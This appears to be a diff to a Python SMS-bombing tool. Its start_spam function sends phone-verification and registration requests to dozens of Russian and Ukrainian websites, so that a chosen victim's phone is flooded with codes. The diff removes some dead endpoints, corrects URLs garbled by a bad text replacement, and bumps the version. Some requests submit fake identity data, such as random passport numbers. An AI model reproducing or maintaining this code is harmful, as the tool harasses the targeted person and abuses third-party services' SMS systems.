@@ -98,7 +98,7 @@ def start_spam(phone):
         try:
             formatted_phone = format_phone(phone, "+# (###) ###-##-##")
             post("https://yaponchik.net/login/login.php",
-                 data={"login": "Y", "countdown": "0", "step": "phone", "Fore.REDirect": "/profile/",
+                 data={"login": "Y", "countdown": "0", "step": "phone", "redirect": "/profile/",
                        "phone": formatted_phone, "code": ""},
                  headers={"User-Agent": user_agent})
         except:
@@ -399,13 +399,6 @@ def start_spam(phone):
             pass
         try:
             formatted_phone = format_phone(phone, "+# (###) ###-##-##")
-            post("https://butovo.pizzapomodoro.ru/ajax/user/auth.php",
-                 data={"AUTH_ACTION": "SEND_USER_CODE", "phone": formatted_phone},
-                 headers={"User-Agent": user_agent})
-        except:
-            pass
-        try:
-            formatted_phone = format_phone(phone, "+# (###) ###-##-##")
             post("https://pliskov.ru/Cube.MoneyRent.Orchard.RentRequest/PhoneConfirmation/SendCode",
                  data={"phone": formatted_phone},
                  headers={"User-Agent": user_agent})
@@ -695,23 +688,11 @@ def start_spam(phone):
         except:
             pass
         try:
-            post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
-                 data={"password": password, "application": "lkp", "login": "+" + phone},
-                 headers={"User-Agent": user_agent})
-        except:
-            pass
-        try:
             post("https://www.ingos.ru/api/v1/lk/auth/register/fast/step2",
                  headers={"Referer": "https://www.ingos.ru/cabinet/registration/personal", "User-Agent": user_agent},
                  json={"Birthday": "1986-07-10T07:19:56.276+02:00", "DocIssueDate": "2004-02-05T07:19:56.276+02:00",
                        "DocNumber": randint(500000, 999999), "DocSeries": randint(5000, 9999), "FirstName": name,
                        "Gender": "M", "LastName": name, "SecondName": name, "Phone": phone9, "Email": email})
-        except:
-            pass
-        try:
-            post("https://informatics.yandex/api/v1/registration/confirmation/phone/send/",
-                 data={"country": "RU", "csrfmiddlewaretoken": "", "phone": phone},
-                 headers={"User-Agent": user_agent})
         except:
             pass
         try:
@@ -763,12 +744,6 @@ def start_spam(phone):
             post("https://crm.getmancar.com.ua/api/veryfyaccount",
                  json={"phone": "+" + phone, "grant_type": "password", "client_id": "gcarAppMob",
                        "client_secret": "SomeRandomCharsAndNumbersMobile"},
-                 headers={"User-Agent": user_agent})
-        except:
-            pass
-        try:
-            post("https://friendsclub.ru/assets/components/pl/connector.php",
-                 data={"casePar": "authSendsms", "MobilePhone": "+" + phone},
                  headers={"User-Agent": user_agent})
         except:
             pass
@@ -868,7 +843,7 @@ def start_spam(phone):
             pass
         try:
             formatted_phone = format_phone(phone, "+# (###) ###-##-##")
-            post("https://api.cFore.REDitter.ru/confirm/sms/send",
+            post("https://api.creditter.ru/confirm/sms/send",
                  json={"phone": formatted_phone, "type": "register"},
                  headers={"User-Agent": user_agent})
         except:
@@ -919,7 +894,7 @@ def start_spam(phone):
             pass
         try:
             formatted_phone = format_phone(phone9, "(###)###-##-##")
-            post("https://Fore.BLUEfin.moscow/auth/register/",
+            post("https://bluefin.moscow/auth/register/",
                  data={"phone": formatted_phone, "sendphone": "Далее"},
                  headers={"User-Agent": user_agent})
         except:
@@ -1006,7 +981,7 @@ def check_internet():
 
 
 def check_version():
-    version = "2.6"
+    version = "2.7"
     if float(version) < float(get("https://raw.githubusercontent.com/cludeex/spammer/master/version.txt").text):
         print(f"\n{Style.BRIGHT}{Fore.RED}[*] Версия устарела и нуждается в обновлении!{Style.RESET_ALL}")
         sleep(2)
